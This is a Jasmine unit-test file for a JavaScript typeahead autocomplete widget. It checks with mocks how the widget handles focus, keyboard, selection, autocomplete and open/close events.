describe('Typeahead', function() {
  var www, testData;

  www = WWW();

  beforeEach(function() {
    var $fixture, $input;

    jasmine.Input.useMock();
    jasmine.Dataset.useMock();
    jasmine.Menu.useMock();

    setFixtures('<input type="text">');

    $fixture = $('#jasmine-fixtures');
    this.$input = $fixture.find('input');

    testData = { val: 'foo bar', obj: 'fiz' };

    this.view = new Typeahead({
      input: new Input(),
      menu: new Menu(),
      eventBus: new EventBus({ el: this.$input })
    }, www);

    this.input = this.view.input;
    this.menu = this.view.menu;
  });

  describe('on selectableClicked', function() {
    var eventName, payload;

    beforeEach(function() {
      eventName = 'selectableClicked';
      payload = $('<foo>');
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onSelectableClicked');
        this.menu.trigger(eventName, payload);
        expect(this.view._onSelectableClicked).not.toHaveBeenCalled();
      });
    });

    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
      });

      it('should select the selectable', function() {
        spyOn(this.view, 'select');
        this.menu.trigger(eventName, payload);
        expect(this.view.select).toHaveBeenCalledWith(payload);
      });
    });
  });

  describe('on asyncRequested', function() {
    var eventName;

    beforeEach(function() {
      eventName = 'asyncRequested';
    });

    it('should trigger typeahead:asyncrequest', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:asyncrequest', spy);
        this.menu.trigger(eventName);
        expect(spy).toHaveBeenCalled();
    });
  });

  describe('on asyncCanceled', function() {
    var eventName;

    beforeEach(function() {
      eventName = 'asyncCanceled';
    });

    it('should trigger typeahead:asynccancel', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:asynccancel', spy);
        this.menu.trigger(eventName);
        expect(spy).toHaveBeenCalled();
    });
  });

  describe('on asyncReceived', function() {
    var eventName;

    beforeEach(function() {
      eventName = 'asyncReceived';
    });

    it('should trigger typeahead:asyncreceive', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:asyncreceive', spy);
        this.menu.trigger(eventName);
        expect(spy).toHaveBeenCalled();
    });
  });

  describe('on datasetRendered', function() {
    var eventName;

    beforeEach(function() {
      eventName = 'datasetRendered';
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onDatasetRendered');
        this.menu.trigger(eventName);
        expect(this.view._onDatasetRendered).not.toHaveBeenCalled();
      });
    });

    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
      });

      it('should update the hint', function() {
        this.input.hasOverflow.andReturn(false);
        this.menu.getTopSelectable.andReturn($('<fiz>'));
        this.menu.getSelectableData.andReturn(testData);
        this.input.getInputValue.andReturn(testData.val.slice(0, 2));

        this.menu.trigger(eventName);

        expect(this.input.setHint).toHaveBeenCalled();
      });

      it('should trigger typeahead:render', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:render', spy);
        this.menu.trigger(eventName);
        expect(spy).toHaveBeenCalled();
      });
    });
  });

  describe('on datasetCleared', function() {
    var eventName;

    beforeEach(function() {
      eventName = 'datasetCleared';
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onDatasetCleared');
        this.menu.trigger(eventName);
        expect(this.view._onDatasetCleared).not.toHaveBeenCalled();
      });
    });

    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
      });

      it('should update the hint', function() {
        this.input.hasOverflow.andReturn(false);
        this.menu.getTopSelectable.andReturn($('<fiz>'));
        this.menu.getSelectableData.andReturn(testData);
        this.input.getInputValue.andReturn(testData.val.slice(0, 2));

        this.menu.trigger(eventName);

        expect(this.input.setHint).toHaveBeenCalled();
      });
    });
  });

  describe('on focused', function() {
    var eventName;

    beforeEach(function() {
      eventName = 'focused';
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should activate typeahead', function() {
        this.input.trigger(eventName);
        expect(this.view.isActive()).toBe(true);
      });

      it('should open menu', function() {
        this.input.trigger(eventName);
        expect(this.menu.open).toHaveBeenCalled();
      });
    });

    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
      });

      it('should open menu', function() {
        this.input.trigger(eventName);
        expect(this.menu.open).toHaveBeenCalled();
      });

      it('should update menu for query if minLength met', function() {
        this.input.getQuery.andReturn('bar');
        this.input.trigger(eventName);
        expect(this.menu.update).toHaveBeenCalledWith('bar');
      });

      it('should not update menu for query if minLength not met', function() {
        this.view.minLength = 1;
        this.input.getQuery.andReturn('');
        this.input.trigger(eventName);
        expect(this.menu.update).not.toHaveBeenCalled();
      });
    });
  });

  describe('on blurred', function() {
    var eventName;

    beforeEach(function() {
      eventName = 'blurred';
    });

    it('should trigger typeahead:change if query changed since focus', function() {
      var spy = jasmine.createSpy();

      this.input.hasQueryChangedSinceLastFocus.andReturn(true);
      this.$input.on('typeahead:change', spy);

      this.input.trigger(eventName);

      expect(spy).toHaveBeenCalled();
    });

    it('should not trigger typeahead:change if query has not changed since focus', function() {
      var spy = jasmine.createSpy();

      this.input.hasQueryChangedSinceLastFocus.andReturn(false);
      this.$input.on('typeahead:change', spy);

      this.input.trigger(eventName);

      expect(spy).not.toHaveBeenCalled();
    });

    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
      });

      it('should deactivate typeahead', function() {
        this.input.trigger(eventName);
        expect(this.view.isActive()).toBe(false);
      });
    });
  });

  describe('on enterKeyed', function() {
    var eventName, payload;

    beforeEach(function() {
      eventName = 'enterKeyed';
      payload = jasmine.createSpyObj('event', ['preventDefault']);
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onEnterKeyed');
        this.input.trigger(eventName, payload);
        expect(this.view._onEnterKeyed).not.toHaveBeenCalled();
      });
    });

    describe('when active and menu is closed', function() {
      beforeEach(function() {
        this.view.activate();
        this.menu.isOpen.andReturn(false);
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onEnterKeyed');
        this.input.trigger(eventName, payload);
        expect(this.view._onEnterKeyed).not.toHaveBeenCalled();
      });
    });

    describe('when active and menu is open', function() {
      beforeEach(function() {
        this.view.activate();
        this.menu.isOpen.andReturn(true);
      });

      it('should select selectable if there is an active one', function() {
        var $el;

        $el = $('<bah>');
        spyOn(this.view, 'select');
        this.menu.getActiveSelectable.andReturn($el);

        this.input.trigger(eventName, payload);

        expect(this.view.select).toHaveBeenCalledWith($el);
      });

      it('should prevent default if active selectale ', function() {
        var $el;

        $el = $('<bah>');
        spyOn(this.view, 'select').andReturn(true);
        this.menu.getActiveSelectable.andReturn($el);

        this.input.trigger(eventName, payload);

        expect(payload.preventDefault).toHaveBeenCalled();
      });

      it('should not select selectable if there is no active one', function() {
        var $el;

        $el = $('<bah>');
        spyOn(this.view, 'select');

        this.input.trigger(eventName, payload);

        expect(this.view.select).not.toHaveBeenCalledWith($el);
      });

      it('should not prevent default if no active selectale', function() {
        var $el;

        spyOn(this.view, 'select').andReturn(true);
        $el = $('<bah>');

        this.input.trigger(eventName, payload);

        expect(payload.preventDefault).not.toHaveBeenCalled();
      });

      it('should not prevent default if selection of active selectable fails', function() {
        var $el;

        $el = $('<bah>');
        spyOn(this.view, 'select').andReturn(false);
        this.menu.getActiveSelectable.andReturn($el);

        this.input.trigger(eventName, payload);

        expect(payload.preventDefault).not.toHaveBeenCalled();
      });
    });
  });

  describe('on tabKeyed', function() {
    var eventName, payload;

    beforeEach(function() {
      eventName = 'tabKeyed';
      payload = jasmine.createSpyObj('event', ['preventDefault']);
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onTabKeyed');
        this.input.trigger(eventName, payload);
        expect(this.view._onTabKeyed).not.toHaveBeenCalled();
      });
    });

    describe('when active and menu is closed', function() {
      beforeEach(function() {
        this.view.activate();
        this.menu.isOpen.andReturn(false);
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onTabKeyed');
        this.input.trigger(eventName, payload);
        expect(this.view._onTabKeyed).not.toHaveBeenCalled();
      });
    });

    describe('when active and menu is open', function() {
      beforeEach(function() {
        this.view.activate();
        this.menu.isOpen.andReturn(true);
      });

      it('should select selectable if there is an active one', function() {
        var $el;

        $el = $('<bah>');
        spyOn(this.view, 'select');
        this.menu.getActiveSelectable.andReturn($el);

        this.input.trigger(eventName, payload);

        expect(this.view.select).toHaveBeenCalledWith($el);
      });

      it('should prevent default if active selectale', function() {
        var $el;

        $el = $('<bah>');
        spyOn(this.view, 'select').andReturn(true);
        this.menu.getActiveSelectable.andReturn($el);

        this.input.trigger(eventName, payload);

        expect(payload.preventDefault).toHaveBeenCalled();
      });

      it('should not select selectable if there is no active one', function() {
        var $el;

        $el = $('<bah>');
        spyOn(this.view, 'select');

        this.input.trigger(eventName, payload);

        expect(this.view.select).not.toHaveBeenCalledWith($el);
      });

      it('should not prevent default if no active selectale', function() {
        var $el;

        $el = $('<bah>');
        spyOn(this.view, 'select');

        this.input.trigger(eventName, payload);

        expect(payload.preventDefault).not.toHaveBeenCalled();
      });

      it('should not prevent default if selection of active selectable fails', function() {
        var $el;

        $el = $('<bah>');
        spyOn(this.view, 'select').andReturn(false);
        this.menu.getActiveSelectable.andReturn($el);

        this.input.trigger(eventName, payload);

        expect(payload.preventDefault).not.toHaveBeenCalled();
      });

      it('should autocomplete to top suggestion', function() {
        var $el;

        $el = $('<foo>');
        spyOn(this.view, 'autocomplete');
        this.menu.getTopSelectable.andReturn($el);

        this.input.trigger(eventName, payload);

        expect(this.view.autocomplete).toHaveBeenCalledWith($el);
      });

      it('should prevent default behavior of DOM event if autocompletion succeeds', function() {
        var $el;

        $el = $('<foo>');
        spyOn(this.view, 'autocomplete').andReturn(true);
        this.menu.getTopSelectable.andReturn($el);

        this.input.trigger(eventName, payload);

        expect(payload.preventDefault).toHaveBeenCalled();
      });

      it('should not prevent default behavior of DOM event if autocompletion fails', function() {
        var $el;

        $el = $('<foo>');
        spyOn(this.view, 'autocomplete').andReturn(false);
        this.menu.getTopSelectable.andReturn($el);

        this.input.trigger(eventName, payload);

        expect(payload.preventDefault).not.toHaveBeenCalled();
      });
    });
  });

  describe('on escKeyed', function() {
    var eventName, payload;

    beforeEach(function() {
      eventName = 'escKeyed';
      payload = jasmine.createSpyObj('event', ['preventDefault']);
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onEscKeyed');
        this.input.trigger(eventName, payload);
        expect(this.view._onEscKeyed).not.toHaveBeenCalled();
      });
    });

    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
      });

      it('should close', function() {
        spyOn(this.view, 'close');
        this.input.trigger(eventName, payload);
        expect(this.view.close).toHaveBeenCalled();
      });
    });
  });

  describe('on upKeyed', function() {
    var eventName, payload;

    beforeEach(function() {
      eventName = 'upKeyed';
      payload = jasmine.createSpyObj('event', ['preventDefault']);
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onUpKeyed');
        this.input.trigger(eventName, payload);
        expect(this.view._onUpKeyed).not.toHaveBeenCalled();
      });
    });

    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
        spyOn(this.view, 'moveCursor');
      });

      it('should open menu', function() {
        this.input.trigger(eventName, payload);
        expect(this.menu.open).toHaveBeenCalled();
      });

      it('should move cursor -1', function() {
        this.input.trigger(eventName, payload);
        expect(this.view.moveCursor).toHaveBeenCalledWith(-1);
      });
    });
  });

  describe('on downKeyed', function() {
    var eventName, payload;

    beforeEach(function() {
      eventName = 'downKeyed';
      payload = jasmine.createSpyObj('event', ['preventDefault']);
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onDownKeyed');
        this.input.trigger(eventName, payload);
        expect(this.view._onDownKeyed).not.toHaveBeenCalled();
      });
    });

    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
        spyOn(this.view, 'moveCursor');
      });

      it('should open menu', function() {
        this.input.trigger(eventName, payload);
        expect(this.menu.open).toHaveBeenCalled();
      });

      it('should move cursor +1', function() {
        this.input.trigger(eventName, payload);
        expect(this.view.moveCursor).toHaveBeenCalledWith(1);
      });
    });
  });

  describe('on leftKeyed', function() {
    var eventName, payload;

    beforeEach(function() {
      eventName = 'leftKeyed';
      payload = jasmine.createSpyObj('event', ['preventDefault']);
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onLeftKeyed');
        this.input.trigger(eventName, payload);
        expect(this.view._onLeftKeyed).not.toHaveBeenCalled();
      });
    });

    describe('when active and menu is closed', function() {
      beforeEach(function() {
        this.view.activate();
        this.menu.isOpen.andReturn(false);
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onLeftKeyed');
        this.input.trigger(eventName, payload);
        expect(this.view._onLeftKeyed).not.toHaveBeenCalled();
      });
    });

    describe('when active and menu is open', function() {
      beforeEach(function() {
        this.view.activate();
        this.menu.isOpen.andReturn(true);
      });

      it('should autocomplete if language is rtl and text cursor is at end', function() {
        var $el = $('<foo>');

        spyOn(this.view, 'autocomplete');
        this.view.dir = 'rtl';
        this.input.isCursorAtEnd.andReturn(true);
        this.menu.getTopSelectable.andReturn($el);

        this.input.trigger(eventName, payload);

        expect(this.view.autocomplete).toHaveBeenCalledWith($el);
      });
    });
  });

  describe('on rightKeyed', function() {
    var eventName, payload;

    beforeEach(function() {
      eventName = 'rightKeyed';
      payload = jasmine.createSpyObj('event', ['preventDefault']);
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onRightKeyed');
        this.input.trigger(eventName, payload);
        expect(this.view._onRightKeyed).not.toHaveBeenCalled();
      });
    });

    describe('when active and menu is closed', function() {
      beforeEach(function() {
        this.view.activate();
        this.menu.isOpen.andReturn(false);
      });

      it('should do nothing', function() {
        spyOn(this.view, '_onRightKeyed');
        this.input.trigger(eventName, payload);
        expect(this.view._onRightKeyed).not.toHaveBeenCalled();
      });
    });

    describe('when active and menu is open', function() {
      beforeEach(function() {
        this.view.activate();
        this.menu.isOpen.andReturn(true);
      });

      it('should autocomplete if language is rtl and text cursor is at end', function() {
        var $el = $('<foo>');

        spyOn(this.view, 'autocomplete');
        this.view.dir = 'ltr';
        this.input.isCursorAtEnd.andReturn(true);
        this.menu.getTopSelectable.andReturn($el);

        this.input.trigger(eventName, payload);

        expect(this.view.autocomplete).toHaveBeenCalledWith($el);
      });
    });
  });

  describe('on queryChanged', function() {
    var eventName, payload;

    beforeEach(function() {
      eventName = 'queryChanged';
      payload = '';
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should not open menu', function() {
        this.input.trigger(eventName, payload);
        expect(this.menu.open).not.toHaveBeenCalled();
      });
    });

    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
        this.view.open();
      });

      it('should open menu', function() {
        this.input.trigger(eventName, payload);
        expect(this.menu.open).toHaveBeenCalled();
      });

      it('should empty menu if minLength is not satisfied', function() {
        this.view.minLength = 100;
        this.input.trigger(eventName, payload);

        expect(this.menu.empty).toHaveBeenCalled();
      });

      it('should update menu if minLength is satisfied', function() {
        this.input.trigger(eventName, 'fiz');
        expect(this.menu.update).toHaveBeenCalledWith('fiz');
      });
    });
  });

  describe('on whitespaceChanged', function() {
    var eventName, payload;

    beforeEach(function() {
      eventName = 'whitespaceChanged';
      payload = '';
    });

    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should not open menu', function() {
        this.input.trigger(eventName, payload);
        expect(this.menu.open).not.toHaveBeenCalled();
      });
    });

    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
      });

      it('should open menu', function() {
        this.input.trigger(eventName, payload);
        expect(this.menu.open).toHaveBeenCalled();
      });

      it('should update the hint', function() {
        this.input.hasFocus.andReturn(true);
        this.input.hasOverflow.andReturn(false);
        this.menu.getTopSelectable.andReturn($('<fiz>'));
        this.menu.getSelectableData.andReturn(testData);

        this.input.getInputValue.andReturn(testData.val.slice(0, 2));

        this.input.trigger(eventName, payload);

        expect(this.input.setHint).toHaveBeenCalledWith(testData.val);
      });
    });
  });

  describe('on langDirChanged', function() {
    var eventName, payload;

    beforeEach(function() {
      eventName = 'langDirChanged';
      payload = 'rtl';
    });

    it('should set direction of menu if direction changed', function() {
      this.view.dir = 'ltr';

      this.input.trigger(eventName, payload);

      expect(this.view.dir).toBe(payload);
      expect(this.menu.setLanguageDirection).toHaveBeenCalled();
    });

    it('should do nothing if direction did not changed', function() {
      this.view.dir = payload;

      this.input.trigger(eventName, payload);

      expect(this.view.dir).toBe(payload);
      expect(this.menu.setLanguageDirection).not.toHaveBeenCalled();
    });
  });

  describe('#isActive', function() {
    it('should return true if active', function() {
      this.view.activate();
      expect(this.view.isActive()).toBe(true);
    });

    it('should return false if active', function() {
      this.view.deactivate();
      expect(this.view.isActive()).toBe(false);
    });
  });

  describe('#isEnabled', function() {
    it('should returned enabled status', function() {
      this.view.enable();
      expect(this.view.isEnabled()).toBe(true);
      this.view.disable();
      expect(this.view.isEnabled()).toBe(false);
    });
  });

  describe('#enable', function() {
    it('should set enabled to true', function() {
      this.view.enable();
      expect(this.view.isEnabled()).toBe(true);
    });
  });

  describe('#disable', function() {
    it('should set enabled to false', function() {
      this.view.disable();
      expect(this.view.isEnabled()).toBe(false);
    });
  });

  describe('#activate', function() {
    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
      });

      it('should do nothing', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:beforeactive', spy);
        this.view.activate();
        expect(spy).not.toHaveBeenCalled();
      });
    });

    describe('when idle and disabled', function() {
      beforeEach(function() {
        this.view.disable();
        this.view.activate();
      });

      it('should do nothing', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:beforeactive', spy);
        this.view.activate();
        expect(spy).not.toHaveBeenCalled();
      });
    });

    describe('when idle and enabled', function() {
      beforeEach(function() {
        this.view.enable();
        this.view.deactivate();
      });

      it('should trigger typeahead:beforeactive', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:beforeactive', spy);
        this.view.activate();
        expect(spy).toHaveBeenCalled();
      });

      it('should support cancellation', function() {
        var spy1, spy2;

        spy1 = jasmine.createSpy().andCallFake(prevent);
        spy2 = jasmine.createSpy();
        this.$input.on('typeahead:beforeactive', spy1);
        this.$input.on('typeahead:active', spy2);

        this.view.activate();

        expect(spy1).toHaveBeenCalled();
        expect(spy2).not.toHaveBeenCalled();
      });

      it('should change state to active', function() {
        expect(this.view.isActive()).toBe(false);
        this.view.activate();
        expect(this.view.isActive()).toBe(true);
      });

      it('should trigger typeahead:active if not canceled', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:active', spy);
        this.view.activate();
        expect(spy).toHaveBeenCalled();
      });
    });
  });

  describe('#deactivate', function() {
    describe('when idle', function() {
      beforeEach(function() {
        this.view.deactivate();
      });

      it('should do nothing', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:beforeidle', spy);
        this.view.deactivate();
        expect(spy).not.toHaveBeenCalled();
      });
    });

    describe('when active', function() {
      beforeEach(function() {
        this.view.activate();
      });

      it('should trigger typeahead:beforeidle', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:beforeidle', spy);
        this.view.deactivate();
        expect(spy).toHaveBeenCalled();
      });

      it('should support cancellation', function() {
        var spy1, spy2;

        spy1 = jasmine.createSpy().andCallFake(prevent);
        spy2 = jasmine.createSpy();
        this.$input.on('typeahead:beforeidle', spy1);
        this.$input.on('typeahead:idle', spy2);

        this.view.deactivate();

        expect(spy1).toHaveBeenCalled();
        expect(spy2).not.toHaveBeenCalled();
      });

      it('should close', function() {
        spyOn(this.view, 'close');
        this.view.deactivate();
        expect(this.view.close).toHaveBeenCalled();
      });

      it('should change state to idle', function() {
        expect(this.view.isActive()).toBe(true);
        this.view.deactivate();
        expect(this.view.isActive()).toBe(false);
      });

      it('should trigger typeahead:idle if not canceled', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:idle', spy);
        this.view.deactivate();
        expect(spy).toHaveBeenCalled();
      });
    });
  });

  describe('#isOpen', function() {
    it('should return true if open', function() {
      this.menu.isOpen.andReturn(true);
      expect(this.view.isOpen()).toBe(true);
    });

    it('should return false if closed', function() {
      this.menu.isOpen.andReturn(false);
      expect(this.view.isOpen()).toBe(false);
    });
  });

  describe('#open', function() {
    describe('when open', function() {
      beforeEach(function() {
        spyOn(this.view, 'isOpen').andReturn(true);
      });

      it('should do nothing', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:beforeopen', spy);
        this.view.open();
        expect(spy).not.toHaveBeenCalled();
      });
    });

    describe('when closed', function() {
      beforeEach(function() {
        spyOn(this.view, 'isOpen').andReturn(false);
      });

      it('should trigger typeahead:beforeopen', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:beforeopen', spy);
        this.view.open();
        expect(spy).toHaveBeenCalled();
      });

      it('should support cancellation', function() {
        var spy1, spy2;

        spy1 = jasmine.createSpy().andCallFake(prevent);
        spy2 = jasmine.createSpy();
        this.$input.on('typeahead:beforeopen', spy1);
        this.$input.on('typeahead:open', spy2);

        this.view.open();

        expect(spy1).toHaveBeenCalled();
        expect(spy2).not.toHaveBeenCalled();
      });

      it('should open menu', function() {
        this.view.open();
        expect(this.menu.open).toHaveBeenCalled();
      });

      it('should update hint if active', function() {
        spyOn(this.view, 'isActive').andReturn(true);

        this.input.hasOverflow.andReturn(false);
        this.menu.getTopSelectable.andReturn($('<fiz>'));
        this.menu.getSelectableData.andReturn(testData);
        this.input.getInputValue.andReturn(testData.val.slice(0, 2));

        this.view.open();

        expect(this.input.setHint).toHaveBeenCalled();
      });

      it('should trigger typeahead:open if not canceled', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:open', spy);
        this.view.open();
        expect(spy).toHaveBeenCalled();
      });
    });
  });

  describe('#close', function() {
    describe('when closed', function() {
      beforeEach(function() {
        spyOn(this.view, 'isOpen').andReturn(false);
      });

      it('should do nothing', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:beforeclose', spy);
        this.view.open();
        expect(spy).not.toHaveBeenCalled();
      });
    });

    describe('when open', function() {
      beforeEach(function() {
        spyOn(this.view, 'isOpen').andReturn(true);
      });

      it('should trigger typeahead:beforeclose', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:beforeclose', spy);
        this.view.close();
        expect(spy).toHaveBeenCalled();
      });

      it('should support cancellation', function() {
        var spy1, spy2;

        spy1 = jasmine.createSpy().andCallFake(prevent);
        spy2 = jasmine.createSpy();
        this.$input.on('typeahead:beforeclose', spy1);
        this.$input.on('typeahead:close', spy2);

        this.view.close();

        expect(spy1).toHaveBeenCalled();
        expect(spy2).not.toHaveBeenCalled();
      });

      it('should close menu', function() {
        this.view.close();
        expect(this.menu.close).toHaveBeenCalled();
      });

      it('should clear hint', function() {
        this.view.close();
        expect(this.input.clearHint).toHaveBeenCalled();
      });

      it('should trigger typeahead:close if not canceled', function() {
        var spy = jasmine.createSpy();

        this.$input.on('typeahead:close', spy);
        this.view.close();
        expect(spy).toHaveBeenCalled();
      });
    });
  });

  describe('#getVal', function() {
    it('should return the current query', function() {
      this.input.getQuery.andReturn('woah');
      expect(this.view.getVal()).toBe('woah');
    });
  });

  describe('#setVal', function() {
    it('should update query', function() {
      this.input.hasFocus.andReturn(true);
      this.view.setVal('woah');
      expect(this.input.setQuery).toHaveBeenCalledWith('woah');
    });
  });





  describe('#select', function() {
    it('should do nothing if element is not a selectable', function() {
      var spy;

      this.menu.getSelectableData.andReturn(null);
      this.$input.on('typeahead:beforeselect', spy = jasmine.createSpy());

      this.view.select($('<bah>'));

      expect(spy).not.toHaveBeenCalled();
    });

    it('should trigger typeahead:beforeselect', function() {
      var spy;

      this.menu.getSelectableData.andReturn(testData);
      this.$input.on('typeahead:beforeselect', spy = jasmine.createSpy());

      this.view.select($('<bah>'));

      expect(spy).toHaveBeenCalled();
    });

    it('should support cancellation', function() {
      var spy1, spy2;

      spy1 = jasmine.createSpy().andCallFake(prevent);
      spy2 = jasmine.createSpy();

      this.menu.getSelectableData.andReturn(testData);
      this.$input.on('typeahead:beforeselect', spy1).on('typeahead:select', spy2);

      this.view.select($('<bah>'));

      expect(spy1).toHaveBeenCalled();
      expect(spy2).not.toHaveBeenCalled();
    });

    it('should update query', function() {
      this.menu.getSelectableData.andReturn(testData);
      this.view.select($('<bah>'));
      expect(this.input.setQuery).toHaveBeenCalledWith(testData.val, true);
    });

    it('should trigger typeahead:select', function() {
      var spy;

      this.menu.getSelectableData.andReturn(testData);
      this.$input.on('typeahead:select', spy = jasmine.createSpy());

      this.view.select($('<bah>'));

      expect(spy).toHaveBeenCalled();
    });

    it('should close', function() {
      spyOn(this.view, 'close');
      this.menu.getSelectableData.andReturn(testData);

      this.view.select($('<bah>'));

      expect(this.view.close).toHaveBeenCalled();
    });
  });

  describe('#autocomplete', function() {
    it('should abort if the query matches the top suggestion', function() {
      var spy;

      this.input.getQuery.andReturn(testData.val);
      this.menu.getSelectableData.andReturn(testData);
      this.$input.on('typeahead:beforeautocomplete', spy = jasmine.createSpy());

      this.view.autocomplete($('<bah>'));

      expect(spy).not.toHaveBeenCalled();
    });

    it('should trigger typeahead:beforeautocomplete', function() {
      var spy;

      this.menu.getSelectableData.andReturn(testData);
      this.$input.on('typeahead:beforeautocomplete', spy = jasmine.createSpy());

      this.view.autocomplete($('<bah>'));

      expect(spy).toHaveBeenCalled();
    });

    it('should support cancellation', function() {
      var spy1, spy2;

      spy1 = jasmine.createSpy().andCallFake(prevent);
      spy2 = jasmine.createSpy();
      this.$input.on('typeahead:beforeautocomplete', spy1);
      this.$input.on('typeahead:autocomplete', spy2);
      this.menu.getSelectableData.andReturn(testData);

      this.view.autocomplete($('<bah>'));

      expect(spy1).toHaveBeenCalled();
      expect(spy2).not.toHaveBeenCalled();
    });

    it('should update the query', function() {
      this.menu.getSelectableData.andReturn(testData);
      this.view.autocomplete($('<bah>'));
      expect(this.input.setQuery).toHaveBeenCalledWith(testData.val);
    });

    it('should trigger typeahead:autocomplete', function() {
      var spy;

      this.menu.getSelectableData.andReturn(testData);
      this.$input.on('typeahead:autocomplete', spy = jasmine.createSpy());

      this.view.autocomplete($('<bah>'));

      expect(spy).toHaveBeenCalled();
    });
  });

  describe('#moveCursor', function() {
    beforeEach(function() {
      this.input.getQuery.andReturn('foo');
    });

    it('should move cursor if minLength is not satisfied', function() {
      var spy = jasmine.createSpy();

      this.view.minLength = 100;
      this.menu.update.andReturn(true);
      this.$input.on('typeahead:beforecursorchange', spy);

      this.view.moveCursor(1);

      expect(spy).toHaveBeenCalled();
    });

    it('should move cursor if invalid update', function() {
      var spy = jasmine.createSpy();

      this.menu.update.andReturn(false);
      this.$input.on('typeahead:beforecursorchange', spy);

      this.view.moveCursor(1);

      expect(spy).toHaveBeenCalled();
    });

    it('should not move cursor if valid update', function() {
      var spy = jasmine.createSpy();

      this.menu.update.andReturn(true);
      this.$input.on('typeahead:beforecursorchange', spy);

      this.view.moveCursor(1);

      expect(spy).not.toHaveBeenCalled();
    });

    it('should trigger typeahead:beforecursorchange', function() {
      var spy = jasmine.createSpy();

      this.$input.on('typeahead:beforecursorchange', spy);
      this.view.moveCursor(1);
      expect(spy).toHaveBeenCalled();
    });

    it('should support cancellation', function() {
      var spy = jasmine.createSpy().andCallFake(prevent);

      this.$input.on('typeahead:beforecursorchange', spy);
      this.view.moveCursor(1);
      expect(this.menu.setCursor).not.toHaveBeenCalled();
    });

    it('should update the input value if moved to selectable', function() {
      this.menu.getSelectableData.andReturn(testData);
      this.view.moveCursor(1);
      expect(this.input.setInputValue).toHaveBeenCalledWith(testData.val);
    });

    it('should reset the input value if moved to input', function() {
      this.view.moveCursor(1);
      expect(this.input.resetInputValue).toHaveBeenCalled();
    });

    it('should update the hint', function() {
      this.input.hasOverflow.andReturn(false);
      this.menu.getTopSelectable.andReturn($('<fiz>'));
      this.menu.getSelectableData.andCallFake(fake);
      this.input.getInputValue.andReturn(testData.val.slice(0, 1));

      this.view.moveCursor(1);

      expect(this.input.setHint).toHaveBeenCalledWith(testData.val);

      function fake($el) {
        return ($el && $el.prop('tagName') === 'FIZ') ? testData : null;
      }
    });

    it('should trigger cursorchange after setting cursor', function() {
      var spy = jasmine.createSpy();

      this.$input.on('typeahead:cursorchange', spy);
      this.view.moveCursor(1);
      expect(spy).toHaveBeenCalled();
    });
  });

  describe('#destroy', function() {
    it('should destroy input', function() {
      this.view.destroy();

      expect(this.input.destroy).toHaveBeenCalled();
    });

    it('should destroy menu', function() {
      this.view.destroy();

      expect(this.menu.destroy).toHaveBeenCalled();
    });
  });

  function prevent($e) { $e.preventDefault(); }
});

